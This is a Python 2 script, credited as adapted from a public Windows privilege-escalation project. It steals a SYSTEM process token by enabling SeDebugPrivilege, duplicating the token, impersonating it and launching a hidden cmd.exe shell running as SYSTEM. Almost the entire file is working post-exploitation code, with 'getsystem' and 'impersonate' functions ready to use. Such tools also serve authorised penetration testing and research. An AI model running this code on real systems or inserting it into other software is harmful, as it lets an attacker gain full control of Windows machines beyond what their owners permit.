#original code from https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
import sys, os
from ctypes import *
import subprocess
import psutil

LPVOID = c_void_p
PVOID = LPVOID
PSID = PVOID
DWORD = c_uint32
LPSTR = c_char_p
HANDLE	  = LPVOID
INVALID_HANDLE_VALUE = c_void_p(-1).value
LONG		= c_long
WORD		= c_uint16

READ_CONTROL					 = 0x00020000L
STANDARD_RIGHTS_READ			 = READ_CONTROL
STANDARD_RIGHTS_REQUIRED		 = 0x000F0000L

TOKEN_ASSIGN_PRIMARY	= 0x0001
TOKEN_DUPLICATE		 = 0x0002
TOKEN_IMPERSONATE	   = 0x0004
TOKEN_QUERY			 = 0x0008
TOKEN_QUERY_SOURCE	  = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS	 = 0x0040
TOKEN_ADJUST_DEFAULT	= 0x0080
TOKEN_ADJUST_SESSIONID  = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
tokenprivs  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)

PROCESS_QUERY_INFORMATION = 0x0400

class LUID(Structure):
	_fields_ = [
		("LowPart",	 DWORD),
		("HighPart",	LONG),
	]

class SID_AND_ATTRIBUTES(Structure):
	_fields_ = [
		("Sid",		 PSID),
		("Attributes",  DWORD),
	]

class TOKEN_USER(Structure):
	_fields_ = [
		("User", SID_AND_ATTRIBUTES),]

class LUID_AND_ATTRIBUTES(Structure):
	_fields_ = [
		("Luid",		LUID),
		("Attributes",  DWORD),
	]

class TOKEN_PRIVILEGES(Structure):
	_fields_ = [
		("PrivilegeCount",  DWORD),
		("Privileges",	  LUID_AND_ATTRIBUTES),
	]

class PROCESS_INFORMATION(Structure):
	_fields_ = [
		('hProcess',	HANDLE),
		('hThread',	 HANDLE),
		('dwProcessId', DWORD),
		('dwThreadId',  DWORD),
	]

class STARTUPINFO(Structure):
	_fields_ = [
		('cb',			  DWORD),
		('lpReserved',	  LPSTR),
		('lpDesktop',	   LPSTR),
		('lpTitle',		 LPSTR),
		('dwX',			 DWORD),
		('dwY',			 DWORD),
		('dwXSize',		 DWORD),
		('dwYSize',		 DWORD),
		('dwXCountChars',   DWORD),
		('dwYCountChars',   DWORD),
		('dwFillAttribute', DWORD),
		('dwFlags',		 DWORD),
		('wShowWindow',	 WORD),
		('cbReserved2',	 WORD),
		('lpReserved2',	 LPVOID),	# LPBYTE
		('hStdInput',	   HANDLE),
		('hStdOutput',	  HANDLE),
		('hStdError',	   HANDLE),
	]

def GetUserName():
	nSize = DWORD(0)
	windll.advapi32.GetUserNameA(None, byref(nSize))
	error = GetLastError()
	
	ERROR_INSUFFICIENT_BUFFER = 122
	if error != ERROR_INSUFFICIENT_BUFFER:
		raise WinError(error)
	
	lpBuffer = create_string_buffer('', nSize.value + 1)
	
	success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
	if not success:
		raise WinError()
	return lpBuffer.value

def GetTokenSid(hToken):
	"""Retrieve SID from Token"""
	dwSize = DWORD(0)
	pStringSid = LPSTR()
	
	print "hToken: %s"%hToken.value
	TokenUser = 1
	r=windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
	if r!=0:
		raise WinError()
	
								
	address = windll.kernel32.LocalAlloc(0x0040, dwSize)
	
	windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))

	pToken_User = cast(address, POINTER(TOKEN_USER))

	windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))

	sid = pStringSid.value
	
	windll.kernel32.LocalFree(address)
	return sid

def EnablePrivilege(privilegeStr, hToken = None):
	"""Enable Privilege on token, if no token is given the function gets the token of the current process."""
	if hToken == None:
		TOKEN_ADJUST_PRIVILEGES = 0x00000020
		TOKEN_QUERY = 0x0008
		hToken = HANDLE(INVALID_HANDLE_VALUE)
		hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, windll.kernel32.GetCurrentProcessId())
		windll.advapi32.OpenProcessToken( hProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
		e=GetLastError()
		if e!=0:
			raise WinError(e)
		windll.kernel32.CloseHandle(hProcess)
	
	privilege_id = LUID()
	windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
	e=GetLastError()
	if e!=0:
		raise WinError(e)

	SE_PRIVILEGE_ENABLED = 0x00000002
	laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
	tp  = TOKEN_PRIVILEGES(1, laa)
	
	windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)  
	e=GetLastError()
	if e!=0:
		raise WinError(e)

def GetProcessToken(token_sid):
	pids = [int(x) for x in psutil.pids() if int(x)>4]

	for pid in pids:
		try:
			
			hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
			error=GetLastError()
			if error!=0:
				raise WinError(error)

			hToken = HANDLE(INVALID_HANDLE_VALUE)
			windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))

##If token SID is the SID of SYSTEM, return the token handle.
			#print "sid: %s %s"%(pid,GetTokenSid(hToken))
			if GetTokenSid( hToken ) == token_sid:
				print "\t[+] Using PID: " + str(pid)
				windll.kernel32.CloseHandle(hProcess)
				return hToken

			windll.kernel32.CloseHandle(hToken)
			windll.kernel32.CloseHandle(hProcess)

		except WindowsError, e :
			print "[!] Error:" + str(e)

def getsystem():
	return impersonate("S-1-5-18")

def impersonate(token_sid):
	if not windll.Shell32.IsUserAnAdmin():
		raise OSError("You need admin rights to run getsystem !")
	print "[+] Enabling SeDebugPrivilege"
	EnablePrivilege("SeDebugPrivilege")
	print "[+] Retrieving SYSTEM token"

	hToken = GetProcessToken(token_sid)

	##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
	print "[+] Duplicating token"
	hTokendupe = HANDLE( INVALID_HANDLE_VALUE )

	SecurityImpersonation = 2
	TokenPrimary = 1
	windll.advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref( hTokendupe ) )

	##Now we have duplicated the token, we can close the orginal.
	windll.kernel32.CloseHandle(hToken)

	##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
	print "[+] Enabling SE_ASSIGNPRIMARYTOKEN_NAME"
	EnablePrivilege( "SeAssignPrimaryTokenPrivilege", hToken = hTokendupe )

	print "[+] Enabling SE_INCREASE_QUOTA_NAME"
	EnablePrivilege( "SeIncreaseQuotaPrivilege", hToken = hTokendupe )

	##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
	print "[+] Enabling SE_IMPERSONATE_NAME"
	EnablePrivilege("SeImpersonatePrivilege")

	print "[+] Impersonating token"
	windll.advapi32.ImpersonateLoggedOnUser( hTokendupe )
	print "[+] Running as: " + GetUserName()
	pid=start_proc_with_token(["cmd.exe"], hTokendupe)
	return pid
	

def start_proc_with_token(args, hTokendupe, hidden=True):
	##Start the process with the token.
	try:
		print "[+] Starting shell as SYSTEM"
		lpProcessInformation = PROCESS_INFORMATION()
		lpStartupInfo = STARTUPINFO()
		if hidden:
			lpStartupInfo.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
			lpStartupInfo.wShowWindow = subprocess.SW_HIDE
		CREATE_NEW_CONSOLE = 0x00000010

		windll.advapi32.CreateProcessAsUserA(hTokendupe, None, ' '.join(args), None, None, True, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))
		print "\t[+] PID: " + str(lpProcessInformation.dwProcessId)
		return lpProcessInformation.dwProcessId
	except WindowsError, e :
		print "[!] Error:" + str(e)

def rev2self():
	windll.advapi32.RevertToSelf()
	print "\t[+] Running as: " + GetUserName()

	#print "\t[+] Closing Handle"
	#windll.kernel32.CloseHandle(hTokendupe)
